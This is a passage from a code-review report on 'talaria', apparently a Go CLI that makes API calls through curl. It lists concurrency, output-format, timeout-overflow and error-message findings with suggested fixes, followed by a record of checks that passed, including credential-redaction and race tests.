  -rw------- 1 casper casper 101388288 ... /tmp/tconc/state9/talaria/.history-3128772551
  -rw------- 1 casper casper 392576217 ... /tmp/tconc/state9/talaria/history.jsonl
  ```
  101 MB stranded; a later kill leaks up to the store's full size, and subsequent runs never clean it. This composes badly with Finding 8: ~2 GB RSS makes OOM kills likely, and every OOM kill during trim leaves another few hundred MB behind.
- **Suggested fix:** Extend the sweep to the state directory — remove `.history-*` entries older than a short grace period — and call it where `SweepStale` is called (cmd/talaria/root.go:205). Alternatively have `Append` unlink stale `.history-*` siblings while it already holds the lock.

## Finding 23: The process-group kill has no already-reaped guard
- **Reviewer:** concurrency
- **Severity:** WARN
- **File:** internal/curl/procgroup_unix.go:33
- **Description:** `syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)` signals a bare negated pid with no check that the child is still alive. `os/exec`'s `Wait` calls `Process.Wait()` — reaping the child and freeing its pid — and only then receives from `ctxResult`, so `watchCtx` can invoke `Cancel` after the reap (ordering confirmed in `$GOROOT/src/os/exec/exec.go:796-880`). If the pid has been recycled as a process-group leader in that window, talaria SIGKILLs an unrelated group owned by the same uid. The stdlib's default `Cancel` is immune because `os.Process` tracks `statusDone` and returns `ErrProcessDone`; overriding it with a raw negated-pid kill discards that. The window is microseconds and pid wrap is slow, hence WARN. The error handling downstream is correct: on ESRCH the fallback `cmd.Process.Kill()` returns `os.ErrProcessDone`, which `watchCtx` treats as "don't inject a needless error".
- **Suggested fix:** Probe with `cmd.Process.Signal(syscall.Signal(0))` first and return its error (os/exec reads `ErrProcessDone` as "already finished") before issuing the group kill.

## Finding 24: The non-unix corpus lock is a silent no-op
- **Reviewer:** concurrency
- **Severity:** WARN
- **File:** internal/corpus/lock_other.go:11
- **Description:** `func lock(string) (func(), error) { return func() {}, nil }` under `//go:build !unix` (excludes Windows, js, wasip1). On those platforms two concurrent processes both run the unserialised read-modify-write in `Append`, and the loser's entry is erased by the winner's `replace()` rename, with `Append` returning `nil` both times so the loss is never reported — contradicting the contract at store.go:94-95. CI is `ubuntu-latest` only so it stays latent, but DESIGN.md:459 promises per-platform binaries. (The unix path itself is correct — verified across 20 concurrent processes at the retention cap: exactly 1000 lines, all new entries present, zero duplicate ids.)
- **Suggested fix:** Implement with `golang.org/x/sys/windows.LockFileEx`, or keep it dependency-free and make it loud: return an error from `lock` on `!unix`, or skip `trim` there so appends stay strictly append-only and nothing can be destroyed.

## Finding 25: `--output tsv` silently renders `pretty` on `describe`, `call` and `history show`
- **Reviewer:** integration
- **Severity:** INFO
- **File:** internal/output/render.go:105
- **Description:** AGENT.md:201 says *"`--output json|pretty|tsv` on every command"*; DESIGN.md §4 lists only `json|pretty` for `describe`. Commands whose `Table` is a list of pre-rendered single-cell lines produce byte-identical output for both formats, so `tsv` is accepted and quietly means `pretty`:

  ```
  $ diff <(talaria describe ./api30.yaml getPet --output tsv) \
         <(talaria describe ./api30.yaml getPet --output pretty) && echo IDENTICAL
  IDENTICAL
  ```
  An agent that branches on format gets no signal its request was not honoured.
- **Suggested fix:** Either reject `--output tsv` on commands with no row-oriented shape (exit 2, `valid_alternatives: ["json","pretty"]`, which is what `--output junit` already does), or narrow AGENT.md:201 to the commands that have a TSV shape (`list`, `search`, `uses`, `history`, `run --report`).

## Finding 26: `--timeout` above ~9.2e9 seconds silently reverts to the 30 s default
- **Reviewer:** concurrency
- **Severity:** INFO
- **File:** cmd/talaria/call.go:230
- **Description:** `time.Duration(seconds * float64(time.Second))` overflows int64 for `seconds > ~9.22e9`; on amd64 the out-of-range float→int conversion yields `math.MinInt64`, which `Options.withDefaults` (internal/curl/config.go:54) reads as "unset" and replaces with 30 s. Observed: `--timeout 10000000000` against a never-answering endpoint died after **30 s**, while `--timeout 5` died after 5 s. Nobody types 292 years, so this is cosmetic — but the same conversion means any parse-level nonsense lands on the default silently rather than as a usage error.
- **Suggested fix:** Reject a `--timeout` that is NaN, infinite, or `> math.MaxInt64/1e9` with a usage error naming the bound, instead of falling through to `withDefaults`.

## Finding 27: `run`'s missing-credential message is ungrammatical
- **Reviewer:** integration
- **Severity:** INFO
- **File:** cmd/talaria/run.go:447
- **Description:** `"no credential for security %s %s"` with `pluralise(n, "scheme")` produces a doubled count:

  ```
  $ talaria run ./api30auth.yaml --report json
  {"error":{"code":5,"message":"no credential for security 5 schemes bearerAuth
   (set $TALARIA_AUTH_BEARER), petKey (set $TALARIA_AUTH_APIKEY_PETKEY), …"}}
  ```
  `auth check` gets it right: `"no credential for security schemes basicAuth (set $TALARIA_AUTH_BASIC), …"`. AGENT.md:143 tells the agent to relay this message to a human verbatim.
- **Suggested fix:** Use the same helper `auth check` uses, or change the format to `"no credential for %s: %s"` so it reads "no credential for 5 security schemes: bearerAuth (…)".

---

## Verified clean (recorded so a later round need not re-derive it)

- **Previous round's CRIT fixes hold under attack.** `64a3504`: SIGINT at t=5 s into a 30-op suite reports `{total: 2, passed: 2, failed: 0}`, history gains exactly 2 lines, exit 1 — nothing fabricated, including the "curl succeeded exactly as ctx was cancelled" interleaving. `94a68c3`: no orphaned curl in any timeout/signal path, including a fake curl that spawns a grandchild and a ~1 MB inline body blocking the stdin copy goroutine. `e0cceae`: 20 concurrent processes at the retention cap produce exactly 1000 lines, zero duplicate ids, oldest evicted first; clean under `-race`.
- **The credential firewall holds on the surfaces it covers.** No canary secret leaked into json, pretty, tsv, dry-run, errors, junit, or the on-disk history store across all five env-var mechanisms. Symbolic curl is correct for every mechanism including the query-string key, and the query-key stderr warning fires exactly once per invocation including across a multi-operation `run`.
- **The emitted curl reproduces the request byte-for-byte on the wire** for GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS, GET-with-body, JSON/form/text/multipart bodies, `@file` and stdin bodies, and all five auth mechanisms — diffed against a raw-socket capture server. `history replay` likewise, including profile-scoped variables.
- **§5 boundary rules hold**: `go list -deps` shows `operation`, `validate` and `gen` import neither `curl` nor `twin`.
- **The `call` JSON shape matches the §4 sketch field-for-field**; all six exit codes reproduce in the situations §4 describes; pretty-on-TTY / JSON-when-piped; curl ≥ 7.70 preflight; `--body` literal/`@file`/`-` with the Go process owning real stdin; the 0600 temp-file fallback; `Set-Cookie` redaction.
- **The full loop works on Swagger 2.0 JSON, OpenAPI 3.0 YAML and 3.1 JSON**, including `basePath` and synthesised operationIds; ids printed by `list`/`search` are accepted verbatim by `describe`/`call`. Every fenced example in AGENT.md and README.md runs as written.
- **No deadlock on large payloads** (10 MB body via temp file, ~1 MB inline, 50 MB response); no goroutine leaks (the app spawns none of its own); `preflightOnce` is race-clean under 24 concurrent calls; spec-cache writes are temp-file + rename and safe against a concurrent reader.
- **`.github/workflows/ci.yml` matches `.ralph/stack.json` verbatim** and pins the same Go version as `go.mod`; `internal/e2e` drives the real binary, not the in-process command tree.
- **The `docs/design/DESIGN.md` diff on this branch is legitimate** — it documents `--timeout` (implemented), corrects the sketch to the `curl -q` actually emitted, and resolves the §8 libopenapi-validator strictness question with a pinned adversarial fixture. None of it is the spec being bent to excuse the code.
